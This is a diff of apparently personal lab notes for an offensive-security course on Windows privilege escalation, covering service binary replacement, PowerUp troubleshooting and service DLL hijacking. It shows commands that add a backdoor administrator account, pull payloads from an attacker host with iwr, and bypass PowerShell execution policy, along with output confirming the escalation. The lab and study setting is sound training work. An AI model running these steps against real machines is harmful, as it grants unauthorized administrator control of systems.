@@ -576,6 +576,7 @@ int main ()
   
   i = system ("net user dave2 password123! /add");
   i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user daveadmin password123!");
   
   return 0;
 }
@@ -584,7 +585,7 @@ $ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 // now transfer to target
 
-PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  
+PS C:\Users\dave> iwr -uri http://192.168.45.165/adduser.exe -Outfile adduser.exe  
 
 PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 
@@ -647,12 +648,176 @@ $ python3 -m http.server 80
 // switch to victim terminal
 
 PS C:\Users\dave> iwr -uri http://222.222.222.222/PowerUp.ps1 -Outfile PowerUp.ps1
-powershell -ep bypass
- . .\PowerUp.ps1
+PS C:\Users\dave> powershell -ep bypass
+PS C:\Users\dave>  . .\PowerUp.ps1
 PS C:\Users\dave> Get-ModifiableServiceFile
 
 // you can use the AbuseFunction to have it create a john:Password123! user and restart the service if you have the right permissions. if you don't, you'll need to reboot the entire machine.
 
 PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
-// throws error because 
 ```
+
+Install-ServiceBinary -Name 'mysql' throws an error that the service binary is not modifiable by the current user, even though we know we have full access perms on the binary. If we review the code of PowerUp and the output of the Get-ModifiableServiceFile commands, we learn that Get-ModifiablePath is used to return modifiable paths for the current user. But, for us, it provides an empty result which causes the error.
+
+Let's see why AbuseFunction throws an error. First, try the service binary path with no arguments with Get-ModifiablePath, and then try to add another argument to check if the function still provides the correct output. Last, try an argument with a path inside.
+
+```console
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+ModifiablePath                IdentityReference Permissions
+--------------                ----------------- -----------
+C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}
+
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+ModifiablePath     IdentityReference                Permissions
+--------------     -----------------                -----------
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}
+
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+```
+
+The above output shows that while the service binary w/ or w/o another arg works as expected, the path as an argument creates an empty result. The mysql service specifies the argument C:\xampp\mysql\bin\my.ini for defaults-file in the service binary path, so AbuseFunction throws the error. In these situations, we should use the result of the identified vulnerable service file and conduct manual exploitation, as shown earlier in this module.
+
+All in all, never blindly trust the output of automated tools. However, PowerUp can help identify potential privilege escalation vectors. If we can't use the tool or get insufficient results, do some manual analysis if the potential vector is not vulnerable or the AbuseFunction just can't exploit it.
+
+### Service DLL Hijacking
+
+Privilege escalation by replacing a service's binary is quite effective, but we often won't have the permissions to do this. 
+
+Dynamic Link Libraries (DLLs) allow programs or the OS to function, like through code, resources, icon files, etc, for exes or objects to use. Devs use these to avoid reinventing the wheel by integrating already-existing functionality. (In Unix, these are called Shared Objects)
+
+Similarly to the previous technique, we can overwrite a DLL that the service binary uses. However, the service might not run as expected. Regardless, we'll most likely stilll get code execution of the DLL's code and run our payload.
+
+We could also hijack the DLL search order, which determines what to inspect first when searching for DLLs (as defined by Microsoft to address DLL hijacking). All Windows versions have safe DLL search most enabled by default. Here is the Microsoft search order:
+
+```
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+```
+
+When safe DLL search is disabled, the current dir is actually searched in position #2.
+
+A special case of our new method is missing DLLs - when a binary attempts to load a DLL that doesn't exist on the system. This is common with flawed installation processes or after updates. Programs can still work missing a DLL, just with limited functionality.
+
+Try to place a malicious DLL named the same as the missing DLL in a path of the DLL search order so it executes when the binary is started.
+
+```console
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Name                      State   PathName
+----                      -----   --------
+...
+BetaService               Running C:\Users\steve\Documents\BetaServ.exe
+...
+
+PS C:\Users\steve> icacls .\Documents\BetaServ.exe
+.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
+                         BUILTIN\Administrators:(F)
+                         CLIENTWK220\steve:(RX)
+                         CLIENTWK220\offsec:(F)
+
+// we don't have perms to replace the binary yet
+```
+
+We can use Process Monitor to display real-time information about processes, threads, file system, or registry-related activities. We need to identify all DLLs located by BetaService AND detect missing ones. With this list, we can check their perms to see if we can replace them. Or, if one is missing, we'll provide our own while adhering to the DLL search order.
+
+We do need admin perms to start Process Monitor. However, in a pentest, we would typically copy the service binary to a local machine. On this target, for example, we can install the service locally and use Process Monitor with admin privs to list all DLL activity.
+
+Browse to C:\tools\Procmon\, double click Procmon64.exe, enter the admin creds, and continue.
+
+Create a filter for your target process through Filter menu > Filter ... and use the following args: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add. If the list turns out empty, restart the service.
+
+```console
+PS C:\Users\steve> Restart-Service BetaService
+```
+
+If the Result column shows NAME NOT FOUND after a CreateFile Operation, this means there's a DLL we can hijack. You can confirm the consecutive function calls follow the DLL search order with:
+
+```console
+PS C:\Users\steve> $env:path
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
+```
+
+These directories match the paths used in the CreateFile calls in Process Monitor.
+
+See where the call attempts to locate the DLL. In this example, the first call attempts to locate the DLL in the Documents folder of the user we're logged in as. This means we have the perms to write to this folder and place our malicious DLL before restarted the service.
+
+Here is an example of a basic DLL written in C++:
+
+```c++
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+```console
+$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+Send this malicious DLL to the victim machine.
+
+
+```console
+PS C:\Users\steve> cd Documents
+
+PS C:\Users\steve\Documents> iwr -uri http://192.168.45.165/myDLL.dll -Outfile myDLL.dll
+
+PS C:\Users\steve\Documents> net user
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+daveadmin                DefaultAccount           Guest
+offsec                   steve                    WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve\Documents> Restart-Service BetaService
+WARNING: Waiting for service 'BetaService (BetaService)' to start...
+WARNING: Waiting for service 'BetaService (BetaService)' to start...
+
+PS C:\Users\steve\Documents> net user
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve\Documents> net localgroup administrators
+...
+Administrator
+BackupAdmin
+dave2
+daveadmin
+offsec
+The command completed successfully.
+```
+
+### Unquoted Service Paths
